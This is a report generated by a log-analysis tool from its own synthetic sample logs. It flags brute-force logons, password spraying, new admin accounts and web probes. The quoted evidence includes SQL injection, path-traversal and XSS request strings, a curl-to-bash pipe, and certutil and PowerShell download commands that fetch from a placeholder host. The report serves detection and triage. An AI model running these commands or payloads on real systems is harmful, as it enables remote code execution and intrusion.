# SOC log analysis report

- Generated: 2026-10-28T09:52:33Z
- Tool: soclog 0.1.0
- Minimum severity: low
- Times are UTC.

These files are the synthetic samples shipped with soclog. The addresses are documentation ranges from RFC 5737. Nothing here is a real incident.

This is a heuristic triage of the log lines below. It is not a declaration that an incident happened.

## Sources

| File | Format | Events | Unparsed lines | Alerts |
| --- | --- | ---: | ---: | ---: |
| samples/linux-auth.log | linux-auth | 30 | 0 | 9 |
| samples/web-access.log | web-access | 29 | 0 | 5 |
| samples/windows-security.json | windows-json | 18 | 0 | 8 |
| samples/windows-security.csv | windows-csv | 9 | 0 | 2 |

## Summary

| ID | Severity | When (UTC) | Source IP | User | Title | ATT&CK |
| --- | --- | --- | --- | --- | --- | --- |
| SOC-001 | high | 2026-10-27 12:00:00Z–12:00:05Z | 203.0.113.50 | - | Possible SQL injection from 203.0.113.50 | T1190 Exploit Public-Facing Application |
| SOC-002 | medium | 2026-10-27 12:00:00Z–12:00:40Z | 203.0.113.50 | - | Scanner user agent from 203.0.113.50 | T1595.002 Active Scanning: Vulnerability Scanning |
| SOC-003 | high | 2026-10-27T12:00:20Z | 203.0.113.50 | - | Possible path traversal from 203.0.113.50 | T1190 Exploit Public-Facing Application |
| SOC-004 | high | 2026-10-27T12:00:30Z | 203.0.113.50 | - | Possible cross-site scripting payload from 203.0.113.50 | T1190 Exploit Public-Facing Application |
| SOC-005 | medium | 2026-10-27 12:02:00Z–12:02:52Z | 203.0.113.50 | - | Burst of 14 HTTP 404 responses from 203.0.113.50 | T1595.003 Active Scanning: Wordlist Scanning |
| SOC-006 | critical | 2026-10-27 13:00:00Z–13:02:00Z | 203.0.113.40 | Administrator | Successful logon for Administrator from 203.0.113.40 after repeated failures | T1110.001 Brute Force: Password Guessing |
| SOC-007 | high | 2026-10-27 14:00:00Z–14:00:50Z | 203.0.113.10 | root | Repeated failed logons for root from 203.0.113.10 | T1110.001 Brute Force: Password Guessing |
| SOC-008 | high | 2026-10-27 15:00:00Z–15:00:50Z | 203.0.113.20 | alpha, bravo, charlie, delta, echo, foxtrot | Password spraying from 203.0.113.20 against 6 accounts | T1110.003 Brute Force: Password Spraying |
| SOC-009 | critical | 2026-10-27 16:40:00Z–16:41:10Z | 203.0.113.30 | admin | Successful logon for admin from 203.0.113.30 after repeated failures | T1110.001 Brute Force: Password Guessing |
| SOC-010 | high | 2026-10-27 17:00:00Z–17:00:50Z | 198.51.100.90 | guest, finance, hr, sales, intern, reception | Password spraying from 198.51.100.90 against 6 accounts | T1110.003 Brute Force: Password Spraying |
| SOC-011 | medium | 2026-10-27T17:30:00Z | - | tempadmin | Windows account tempadmin was created | T1136 Create Account |
| SOC-012 | medium | 2026-10-27T18:00:00Z | - | svcbackup | Local account svcbackup was created | T1136.001 Create Account: Local Account |
| SOC-013 | high | 2026-10-27T18:00:05Z | - | svcbackup | svcbackup was added to sudo | T1098.007 Account Manipulation: Additional Local or Domain Groups |
| SOC-014 | high | 2026-10-27T18:05:00Z | - | www-data | Shell command piped from curl or wget for www-data | T1059.004 Command and Scripting Interpreter: Unix Shell |
| SOC-015 | high | 2026-10-27T18:06:00Z | - | www-data | wget wrote a file under /tmp for www-data | T1105 Ingress Tool Transfer |
| SOC-016 | high | 2026-10-27T18:07:00Z | - | www-data | curl wrote a file under /tmp for www-data | T1105 Ingress Tool Transfer |
| SOC-017 | medium | 2026-10-27T18:10:00Z | - | svcbackup | Windows account svcbackup was created | T1136 Create Account |
| SOC-018 | high | 2026-10-27T18:11:00Z | - | svcbackup | svcbackup was added to Administrators | T1098.007 Account Manipulation: Additional Local or Domain Groups |
| SOC-019 | high | 2026-10-27T18:20:00Z | - | Administrator | Encoded PowerShell command for Administrator | T1059.001 Command and Scripting Interpreter: PowerShell |
| SOC-020 | high | 2026-10-27T18:21:00Z | - | Administrator | certutil downloaded a file for Administrator | T1105 Ingress Tool Transfer |
| SOC-021 | high | 2026-10-27T18:22:00Z | - | Administrator | PowerShell download command for Administrator | T1105 Ingress Tool Transfer |
| SOC-022 | critical | 2026-10-27T18:30:00Z | - | Administrator | Windows audit log cleared | T1070.001 Indicator Removal: Clear Windows Event Logs |
| SOC-023 | low | 2026-10-27T23:15:00Z | 198.51.100.77 | analyst | Successful logon for analyst from 198.51.100.77 during unusual hours | T1078 Valid Accounts |
| SOC-024 | low | 2026-10-27T23:40:00Z | 198.51.100.40 | ops | Successful logon for ops from 198.51.100.40 during unusual hours | T1078 Valid Accounts |

## ATT&CK techniques seen

| Technique | Name | Alerts |
| --- | --- | ---: |
| T1190 | Exploit Public-Facing Application | 3 |
| T1595.002 | Active Scanning: Vulnerability Scanning | 1 |
| T1595.003 | Active Scanning: Wordlist Scanning | 1 |
| T1110.001 | Brute Force: Password Guessing | 3 |
| T1110.003 | Brute Force: Password Spraying | 2 |
| T1136 | Create Account | 2 |
| T1136.001 | Create Account: Local Account | 1 |
| T1098.007 | Account Manipulation: Additional Local or Domain Groups | 2 |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | 1 |
| T1105 | Ingress Tool Transfer | 4 |
| T1059.001 | Command and Scripting Interpreter: PowerShell | 1 |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | 1 |
| T1078 | Valid Accounts | 2 |

## Timeline

- 2026-10-27T12:00:00Z — SOC-001 — high — Possible SQL injection from 203.0.113.50 (T1190)
- 2026-10-27T12:00:00Z — SOC-002 — medium — Scanner user agent from 203.0.113.50 (T1595.002)
- 2026-10-27T12:00:20Z — SOC-003 — high — Possible path traversal from 203.0.113.50 (T1190)
- 2026-10-27T12:00:30Z — SOC-004 — high — Possible cross-site scripting payload from 203.0.113.50 (T1190)
- 2026-10-27T12:02:00Z — SOC-005 — medium — Burst of 14 HTTP 404 responses from 203.0.113.50 (T1595.003)
- 2026-10-27T13:00:00.123456Z — SOC-006 — critical — Successful logon for Administrator from 203.0.113.40 after repeated failures (T1110.001)
- 2026-10-27T14:00:00Z — SOC-007 — high — Repeated failed logons for root from 203.0.113.10 (T1110.001)
- 2026-10-27T15:00:00Z — SOC-008 — high — Password spraying from 203.0.113.20 against 6 accounts (T1110.003)
- 2026-10-27T16:40:00Z — SOC-009 — critical — Successful logon for admin from 203.0.113.30 after repeated failures (T1110.001)
- 2026-10-27T17:00:00Z — SOC-010 — high — Password spraying from 198.51.100.90 against 6 accounts (T1110.003)
- 2026-10-27T17:30:00Z — SOC-011 — medium — Windows account tempadmin was created (T1136)
- 2026-10-27T18:00:00Z — SOC-012 — medium — Local account svcbackup was created (T1136.001)
- 2026-10-27T18:00:05Z — SOC-013 — high — svcbackup was added to sudo (T1098.007)
- 2026-10-27T18:05:00Z — SOC-014 — high — Shell command piped from curl or wget for www-data (T1059.004)
- 2026-10-27T18:06:00Z — SOC-015 — high — wget wrote a file under /tmp for www-data (T1105)
- 2026-10-27T18:07:00Z — SOC-016 — high — curl wrote a file under /tmp for www-data (T1105)
- 2026-10-27T18:10:00Z — SOC-017 — medium — Windows account svcbackup was created (T1136)
- 2026-10-27T18:11:00Z — SOC-018 — high — svcbackup was added to Administrators (T1098.007)
- 2026-10-27T18:20:00Z — SOC-019 — high — Encoded PowerShell command for Administrator (T1059.001)
- 2026-10-27T18:21:00Z — SOC-020 — high — certutil downloaded a file for Administrator (T1105)
- 2026-10-27T18:22:00Z — SOC-021 — high — PowerShell download command for Administrator (T1105)
- 2026-10-27T18:30:00Z — SOC-022 — critical — Windows audit log cleared (T1070.001)
- 2026-10-27T23:15:00Z — SOC-023 — low — Successful logon for analyst from 198.51.100.77 during unusual hours (T1078)
- 2026-10-27T23:40:00Z — SOC-024 — low — Successful logon for ops from 198.51.100.40 during unusual hours (T1078)

## Alerts

### SOC-001 — Possible SQL injection from 203.0.113.50

- Severity: high
- Rule: `web-sqli`
- ATT&CK: T1190 Exploit Public-Facing Application
- When (UTC): 2026-10-27T12:00:00Z to 2026-10-27T12:00:05Z
- Source IP: 203.0.113.50
- User: -
- Log: `samples/web-access.log` (web-access)
- Events in this alert: 2
- What to do next: The request contains a pattern often used for SQL injection. It may be a scan rather than a successful exploit. Check the application response and whether the database shows anything unexpected. Block the source if this site should not be receiving it.

Evidence:

~~~~
203.0.113.50 - - [27/Oct/2026:12:00:00 +0000] "GET /search?q=1%27%20OR%201%3D1 HTTP/1.1" 500 400 "-" "sqlmap/1.7"
203.0.113.50 - - [27/Oct/2026:12:00:05 +0000] "GET /items?id=1+UNION+SELECT+1,2,3 HTTP/1.1" 500 400 "-" "sqlmap/1.7"
~~~~

### SOC-002 — Scanner user agent from 203.0.113.50

- Severity: medium
- Rule: `web-scanner-ua`
- ATT&CK: T1595.002 Active Scanning: Vulnerability Scanning
- When (UTC): 2026-10-27T12:00:00Z to 2026-10-27T12:00:40Z
- Source IP: 203.0.113.50
- User: -
- Log: `samples/web-access.log` (web-access)
- Events in this alert: 3
- What to do next: The user agent matches a vulnerability or content scanner such as sqlmap, Nikto, or Nmap. A scanner is reconnaissance (T1595.002), not proof that an exploit worked. Block or rate-limit the source if this site should not be scanned, and read the other requests it made.

Evidence:

~~~~
203.0.113.50 - - [27/Oct/2026:12:00:00 +0000] "GET /search?q=1%27%20OR%201%3D1 HTTP/1.1" 500 400 "-" "sqlmap/1.7"
203.0.113.50 - - [27/Oct/2026:12:00:05 +0000] "GET /items?id=1+UNION+SELECT+1,2,3 HTTP/1.1" 500 400 "-" "sqlmap/1.7"
203.0.113.50 - - [27/Oct/2026:12:00:40 +0000] "GET /robots.txt HTTP/1.1" 200 80 "-" "Nikto/2.1.6"
~~~~

### SOC-003 — Possible path traversal from 203.0.113.50

- Severity: high
- Rule: `web-traversal`
- ATT&CK: T1190 Exploit Public-Facing Application
- When (UTC): 2026-10-27T12:00:20Z to 2026-10-27T12:00:20Z
- Source IP: 203.0.113.50
- User: -
- Log: `samples/web-access.log` (web-access)
- Events in this alert: 1
- What to do next: The request tries to walk outside the web root or read a well-known file such as /etc/passwd. Check whether the server actually returned file contents. If it did, treat the host as exposed and patch the application.

Evidence:

~~~~
203.0.113.50 - - [27/Oct/2026:12:00:20 +0000] "GET /download?file=../../etc/passwd HTTP/1.1" 400 180 "-" "Mozilla/5.0"
~~~~

### SOC-004 — Possible cross-site scripting payload from 203.0.113.50

- Severity: high
- Rule: `web-xss`
- ATT&CK: T1190 Exploit Public-Facing Application
- When (UTC): 2026-10-27T12:00:30Z to 2026-10-27T12:00:30Z
- Source IP: 203.0.113.50
- User: -
- Log: `samples/web-access.log` (web-access)
- Events in this alert: 1
- What to do next: The request contains a script or event-handler payload. See whether the application stored it or reflected it. If it is only a probe that returned an error, record the source and watch for a follow-up.

Evidence:

~~~~
203.0.113.50 - - [27/Oct/2026:12:00:30 +0000] "GET /comment?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 300 "-" "Mozilla/5.0"
~~~~

### SOC-005 — Burst of 14 HTTP 404 responses from 203.0.113.50

- Severity: medium
- Rule: `web-404-burst`
- ATT&CK: T1595.003 Active Scanning: Wordlist Scanning
- When (UTC): 2026-10-27T12:02:00Z to 2026-10-27T12:02:52Z
- Source IP: 203.0.113.50
- User: -
- Log: `samples/web-access.log` (web-access)
- Events in this alert: 14
- What to do next: This client received many 404 responses in a few minutes, which is what directory and file wordlists look like (T1595.003). Confirm it is not a broken link checker you run yourself. If the paths include admin pages, backups, or .env, treat it as reconnaissance and block the source if you do not recognise it.

Evidence:

~~~~
203.0.113.50 - - [27/Oct/2026:12:02:24 +0000] "GET /phpmyadmin HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:28 +0000] "GET /config.php HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:32 +0000] "GET /owa HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:36 +0000] "GET /remote/login HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:40 +0000] "GET /cgi-bin/ HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:44 +0000] "GET /sitemap.xml.bak HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:48 +0000] "GET /test.php HTTP/1.1" 404 196 "-" "Mozilla/5.0"
203.0.113.50 - - [27/Oct/2026:12:02:52 +0000] "GET /old/ HTTP/1.1" 404 196 "-" "Mozilla/5.0"
… 6 more event(s) not shown
~~~~

### SOC-006 — Successful logon for Administrator from 203.0.113.40 after repeated failures

- Severity: critical
- Rule: `success-after-failures`
- ATT&CK: T1110.001 Brute Force: Password Guessing
- When (UTC): 2026-10-27T13:00:00.123456Z to 2026-10-27T13:02:00Z
- Source IP: 203.0.113.40
- User: Administrator
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 7
- What to do next: A logon succeeded after repeated failures from the same source. Treat that session as untrusted until someone confirms it was expected. Reset the password for the account that got in, review what it did next, and block the source if you do not recognise it. If many different accounts failed first, this fits password spraying (T1110.003) rather than guessing against one account (T1110.001).

Evidence:

~~~~
{"EventID":4625,"TimeCreated":"2026-10-27T13:00:00.1234567Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":3,"Status":"0xC000006D"}
{"EventID":4625,"TimeCreated":"2026-10-27T13:00:15Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":3}
{"EventID":4625,"TimeCreated":"2026-10-27T13:00:30Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":3}
{"EventID":4625,"TimeCreated":"2026-10-27T13:00:45Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":3}
{"EventID":4625,"TimeCreated":"2026-10-27T13:01:00Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":3}
{"EventID":4625,"TimeCreated":"2026-10-27T13:01:15Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":3}
{"EventID":4624,"TimeCreated":"2026-10-27T13:02:00Z","Computer":"win-demo","TargetUserName":"Administrator","IpAddress":"203.0.113.40","LogonType":10}
~~~~

### SOC-007 — Repeated failed logons for root from 203.0.113.10

- Severity: high
- Rule: `auth-brute-force`
- ATT&CK: T1110.001 Brute Force: Password Guessing
- When (UTC): 2026-10-27T14:00:00Z to 2026-10-27T14:00:50Z
- Source IP: 203.0.113.10
- User: root
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 6
- What to do next: Check whether this account exists and whether the source is a scanner or someone who should be logging in. Five failures in ten minutes is only a threshold: a mistyped password can look the same. If the source is not recognised, block it and see whether a successful logon followed.

Evidence:

~~~~
2026-10-27T14:00:00Z web01 sshd[1601]: Failed password for root from 203.0.113.10 port 41001 ssh2
2026-10-27T14:00:10Z web01 sshd[1602]: Failed password for root from 203.0.113.10 port 41002 ssh2
2026-10-27T14:00:20Z web01 sshd[1603]: Failed password for root from 203.0.113.10 port 41003 ssh2
2026-10-27T14:00:30Z web01 sshd[1604]: Failed password for root from 203.0.113.10 port 41004 ssh2
2026-10-27T14:00:40Z web01 sshd[1605]: Failed password for root from 203.0.113.10 port 41005 ssh2
2026-10-27T14:00:50Z web01 sshd[1606]: Failed password for root from 203.0.113.10 port 41006 ssh2
~~~~

### SOC-008 — Password spraying from 203.0.113.20 against 6 accounts

- Severity: high
- Rule: `password-spray`
- ATT&CK: T1110.003 Brute Force: Password Spraying
- When (UTC): 2026-10-27T15:00:00Z to 2026-10-27T15:00:50Z
- Source IP: 203.0.113.20
- User: alpha, bravo, charlie, delta, echo, foxtrot
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 6
- What to do next: One source tried a small number of passwords against several accounts. Compare the account list with people who work here before locking accounts. If the source is not a known gateway or VPN, block it and look for a later success from the same address.

Evidence:

~~~~
2026-10-27T15:00:00Z web01 sshd[1701]: Failed password for invalid user alpha from 203.0.113.20 port 42001 ssh2
2026-10-27T15:00:10Z web01 sshd[1702]: Failed password for invalid user bravo from 203.0.113.20 port 42002 ssh2
2026-10-27T15:00:20Z web01 sshd[1703]: Failed password for invalid user charlie from 203.0.113.20 port 42003 ssh2
2026-10-27T15:00:30Z web01 sshd[1704]: Failed password for invalid user delta from 203.0.113.20 port 42004 ssh2
2026-10-27T15:00:40Z web01 sshd[1705]: Failed password for invalid user echo from 203.0.113.20 port 42005 ssh2
2026-10-27T15:00:50Z web01 sshd[1706]: Failed password for invalid user foxtrot from 203.0.113.20 port 42006 ssh2
~~~~

### SOC-009 — Successful logon for admin from 203.0.113.30 after repeated failures

- Severity: critical
- Rule: `success-after-failures`
- ATT&CK: T1110.001 Brute Force: Password Guessing
- When (UTC): 2026-10-27T16:40:00Z to 2026-10-27T16:41:10Z
- Source IP: 203.0.113.30
- User: admin
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 7
- What to do next: A logon succeeded after repeated failures from the same source. Treat that session as untrusted until someone confirms it was expected. Reset the password for the account that got in, review what it did next, and block the source if you do not recognise it. If many different accounts failed first, this fits password spraying (T1110.003) rather than guessing against one account (T1110.001).

Evidence:

~~~~
2026-10-27T16:40:00Z web01 sshd[1801]: Failed password for admin from 203.0.113.30 port 43001 ssh2
2026-10-27T16:40:10Z web01 sshd[1802]: Failed password for admin from 203.0.113.30 port 43002 ssh2
2026-10-27T16:40:20Z web01 sshd[1803]: Failed password for admin from 203.0.113.30 port 43003 ssh2
2026-10-27T16:40:30Z web01 sshd[1804]: Failed password for admin from 203.0.113.30 port 43004 ssh2
2026-10-27T16:40:40Z web01 sshd[1805]: Failed password for admin from 203.0.113.30 port 43005 ssh2
2026-10-27T16:40:50Z web01 sshd[1806]: Failed password for admin from 203.0.113.30 port 43006 ssh2
2026-10-27T16:41:10Z web01 sshd[1807]: Accepted password for admin from 203.0.113.30 port 43007 ssh2
~~~~

### SOC-010 — Password spraying from 198.51.100.90 against 6 accounts

- Severity: high
- Rule: `password-spray`
- ATT&CK: T1110.003 Brute Force: Password Spraying
- When (UTC): 2026-10-27T17:00:00Z to 2026-10-27T17:00:50Z
- Source IP: 198.51.100.90
- User: guest, finance, hr, sales, intern, reception
- Log: `samples/windows-security.csv` (windows-csv)
- Events in this alert: 6
- What to do next: One source tried a small number of passwords against several accounts. Compare the account list with people who work here before locking accounts. If the source is not a known gateway or VPN, block it and look for a later success from the same address.

Evidence:

~~~~
2026-10-27T17:00:00Z,4625,win-demo,guest,-,198.51.100.90,3,,,
2026-10-27T17:00:10Z,4625,win-demo,finance,-,198.51.100.90,3,,,
2026-10-27T17:00:20Z,4625,win-demo,hr,-,198.51.100.90,3,,,
2026-10-27T17:00:30Z,4625,win-demo,sales,-,198.51.100.90,3,,,
2026-10-27T17:00:40Z,4625,win-demo,intern,-,198.51.100.90,3,,,
2026-10-27T17:00:50Z,4625,win-demo,reception,-,198.51.100.90,3,,,
~~~~

### SOC-011 — Windows account tempadmin was created

- Severity: medium
- Rule: `windows-user-created`
- ATT&CK: T1136 Create Account
- When (UTC): 2026-10-27T17:30:00Z to 2026-10-27T17:30:00Z
- Source IP: -
- User: tempadmin
- Log: `samples/windows-security.csv` (windows-csv)
- Events in this alert: 1
- What to do next: Event 4720 means an account was created. It does not say whether the account is local or domain-wide. On a domain controller this is often a domain account (T1136.002), so the alert stays on the parent technique T1136. Confirm who created it and whether it was requested. If not, disable it.

Evidence:

~~~~
2026-10-27T17:30:00Z,4720,win-demo,tempadmin,Administrator,-,3,,,
~~~~

### SOC-012 — Local account svcbackup was created

- Severity: medium
- Rule: `local-user-created`
- ATT&CK: T1136.001 Create Account: Local Account
- When (UTC): 2026-10-27T18:00:00Z to 2026-10-27T18:00:00Z
- Source IP: -
- User: svcbackup
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 1
- What to do next: A local account was created with useradd or adduser. Confirm there is a change ticket and that the account is not an extra administrator. If nobody expected it, disable the account and look for the process that created it.

Evidence:

~~~~
2026-10-27T18:00:00Z web01 useradd[3101]: new user: name=svcbackup, UID=1007, GID=1007, home=/home/svcbackup, shell=/bin/bash
~~~~

### SOC-013 — svcbackup was added to sudo

- Severity: high
- Rule: `privileged-group-add`
- ATT&CK: T1098.007 Account Manipulation: Additional Local or Domain Groups
- When (UTC): 2026-10-27T18:00:05Z to 2026-10-27T18:00:05Z
- Source IP: -
- User: svcbackup
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 1
- What to do next: This account was added to a group that can administer the host or the domain (sudo, wheel, Administrators, Domain Admins, and similar). Confirm the change was requested. If it was not, remove the membership and review other actions by the account that made the change. Adding someone to an ordinary group such as Users does not raise this alert.

Evidence:

~~~~
2026-10-27T18:00:05Z web01 usermod[3102]: add 'svcbackup' to group 'sudo'
~~~~

### SOC-014 — Shell command piped from curl or wget for www-data

- Severity: high
- Rule: `shell-pipe-download`
- ATT&CK: T1059.004 Command and Scripting Interpreter: Unix Shell
- When (UTC): 2026-10-27T18:05:00Z to 2026-10-27T18:05:00Z
- Source IP: -
- User: www-data
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 1
- What to do next: A command downloads content and pipes it into a shell. That runs whatever the URL returns. Find which account did it and what changed afterwards. If you do not recognise the URL, isolate the host. This is mapped to Unix shell (T1059.004), not PowerShell, because the pipe targets sh or bash.

Evidence:

~~~~
2026-10-27T18:05:00Z web01 sudo[3200]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -fsSL http://203.0.113.80/setup.sh | bash
~~~~

### SOC-015 — wget wrote a file under /tmp for www-data

- Severity: high
- Rule: `wget-to-tmp`
- ATT&CK: T1105 Ingress Tool Transfer
- When (UTC): 2026-10-27T18:06:00Z to 2026-10-27T18:06:00Z
- Source IP: -
- User: www-data
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 1
- What to do next: wget was told to save a file under /tmp. wget is a normal admin tool, so check the URL and who ran it. If you do not recognise the URL, quarantine the file and do not execute it. This program does not contact the URL.

Evidence:

~~~~
2026-10-27T18:06:00Z web01 sudo[3201]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -O /tmp/setup.sh http://203.0.113.80/setup.sh
~~~~

### SOC-016 — curl wrote a file under /tmp for www-data

- Severity: high
- Rule: `curl-to-tmp`
- ATT&CK: T1105 Ingress Tool Transfer
- When (UTC): 2026-10-27T18:07:00Z to 2026-10-27T18:07:00Z
- Source IP: -
- User: www-data
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 1
- What to do next: curl was told to save a file under /tmp. Check the URL and the account. A download into /tmp from an address you do not recognise is worth quarantining. This program does not contact the URL.

Evidence:

~~~~
2026-10-27T18:07:00Z web01 sudo[3202]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/stage.bin http://203.0.113.80/stage.bin
~~~~

### SOC-017 — Windows account svcbackup was created

- Severity: medium
- Rule: `windows-user-created`
- ATT&CK: T1136 Create Account
- When (UTC): 2026-10-27T18:10:00Z to 2026-10-27T18:10:00Z
- Source IP: -
- User: svcbackup
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: Event 4720 means an account was created. It does not say whether the account is local or domain-wide. On a domain controller this is often a domain account (T1136.002), so the alert stays on the parent technique T1136. Confirm who created it and whether it was requested. If not, disable it.

Evidence:

~~~~
{"EventID":4720,"TimeCreated":"2026-10-27T18:10:00Z","Computer":"win-demo","TargetUserName":"svcbackup","SubjectUserName":"Administrator"}
~~~~

### SOC-018 — svcbackup was added to Administrators

- Severity: high
- Rule: `privileged-group-add`
- ATT&CK: T1098.007 Account Manipulation: Additional Local or Domain Groups
- When (UTC): 2026-10-27T18:11:00Z to 2026-10-27T18:11:00Z
- Source IP: -
- User: svcbackup
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: This account was added to a group that can administer the host or the domain (sudo, wheel, Administrators, Domain Admins, and similar). Confirm the change was requested. If it was not, remove the membership and review other actions by the account that made the change. Adding someone to an ordinary group such as Users does not raise this alert.

Evidence:

~~~~
{"EventID":4732,"TimeCreated":"2026-10-27T18:11:00Z","Computer":"win-demo","SubjectUserName":"Administrator","MemberName":"svcbackup","TargetUserName":"Administrators","GroupName":"Administrators"}
~~~~

### SOC-019 — Encoded PowerShell command for Administrator

- Severity: high
- Rule: `encoded-powershell`
- ATT&CK: T1059.001 Command and Scripting Interpreter: PowerShell
- When (UTC): 2026-10-27T18:20:00Z to 2026-10-27T18:20:00Z
- Source IP: -
- User: Administrator
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: The command line uses PowerShell's encoded-command switch or FromBase64String. Installers sometimes do this too, so decode it on a machine you trust and compare the parent process with what you expect. Do not run the decoded script to see what it does.

Evidence:

~~~~
{"EventID":4688,"TimeCreated":"2026-10-27T18:20:00Z","Computer":"win-demo","SubjectUserName":"Administrator","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoProfile -EncodedCommand QQBjAG0AZQA="}
~~~~

### SOC-020 — certutil downloaded a file for Administrator

- Severity: high
- Rule: `certutil-download`
- ATT&CK: T1105 Ingress Tool Transfer
- When (UTC): 2026-10-27T18:21:00Z to 2026-10-27T18:21:00Z
- Source IP: -
- User: Administrator
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: certutil -urlcache was used to download a file. Windows admins sometimes use certutil for legitimate downloads, and so do intruders. Check the URL and the destination path. certutil -hashfile does not match this rule. This program does not contact the URL.

Evidence:

~~~~
{"EventID":4688,"TimeCreated":"2026-10-27T18:21:00Z","Computer":"win-demo","SubjectUserName":"Administrator","NewProcessName":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://203.0.113.80/tool.bin C:\\Users\\Public\\tool.bin"}
~~~~

### SOC-021 — PowerShell download command for Administrator

- Severity: high
- Rule: `powershell-download`
- ATT&CK: T1105 Ingress Tool Transfer
- When (UTC): 2026-10-27T18:22:00Z to 2026-10-27T18:22:00Z
- Source IP: -
- User: Administrator
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: PowerShell was used to download a file (DownloadString, DownloadFile, or Invoke-WebRequest -OutFile). MITRE lists these under Ingress Tool Transfer (T1105). Decode or read the URL on a machine you trust, and do not run the downloaded file to test it.

Evidence:

~~~~
{"EventID":4688,"TimeCreated":"2026-10-27T18:22:00Z","Computer":"win-demo","SubjectUserName":"Administrator","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoProfile -Command \"Invoke-WebRequest -OutFile C:\\Users\\Public\\note.txt http://203.0.113.80/note.txt\""}
~~~~

### SOC-022 — Windows audit log cleared

- Severity: critical
- Rule: `audit-log-cleared`
- ATT&CK: T1070.001 Indicator Removal: Clear Windows Event Logs
- When (UTC): 2026-10-27T18:30:00Z to 2026-10-27T18:30:00Z
- Source IP: -
- User: Administrator
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: Event 1102 means the Windows audit log was cleared. That removes evidence of earlier actions on this host. Identify who cleared it and keep any other copy of the log (a collector, a backup, or a forwarded copy) before it ages out.

Evidence:

~~~~
{"EventID":1102,"TimeCreated":"2026-10-27T18:30:00Z","Computer":"win-demo","SubjectUserName":"Administrator"}
~~~~

### SOC-023 — Successful logon for analyst from 198.51.100.77 during unusual hours

- Severity: low
- Rule: `unusual-hours`
- ATT&CK: T1078 Valid Accounts
- When (UTC): 2026-10-27T23:15:00Z to 2026-10-27T23:15:00Z
- Source IP: 198.51.100.77
- User: analyst
- Log: `samples/windows-security.json` (windows-json)
- Events in this alert: 1
- What to do next: This logon falls between 22:00 and 05:00 UTC, about 00:00 to 07:00 in South Africa (SAST, UTC+2, no daylight saving). The tool does not know this account's normal hours. Ask whether this person or job is supposed to authenticate then. On its own this is not evidence of compromise. Mapping it to T1078 only means an existing account was used.

Evidence:

~~~~
{"EventID":4624,"TimeCreated":"2026-10-27T23:15:00Z","Computer":"win-demo","TargetUserName":"analyst","IpAddress":"198.51.100.77","LogonType":10}
~~~~

### SOC-024 — Successful logon for ops from 198.51.100.40 during unusual hours

- Severity: low
- Rule: `unusual-hours`
- ATT&CK: T1078 Valid Accounts
- When (UTC): 2026-10-27T23:40:00Z to 2026-10-27T23:40:00Z
- Source IP: 198.51.100.40
- User: ops
- Log: `samples/linux-auth.log` (linux-auth)
- Events in this alert: 1
- What to do next: This logon falls between 22:00 and 05:00 UTC, about 00:00 to 07:00 in South Africa (SAST, UTC+2, no daylight saving). The tool does not know this account's normal hours. Ask whether this person or job is supposed to authenticate then. On its own this is not evidence of compromise. Mapping it to T1078 only means an existing account was used.

Evidence:

~~~~
2026-10-27T23:40:00Z web01 sshd[1901]: Accepted password for ops from 198.51.100.40 port 44010 ssh2
~~~~
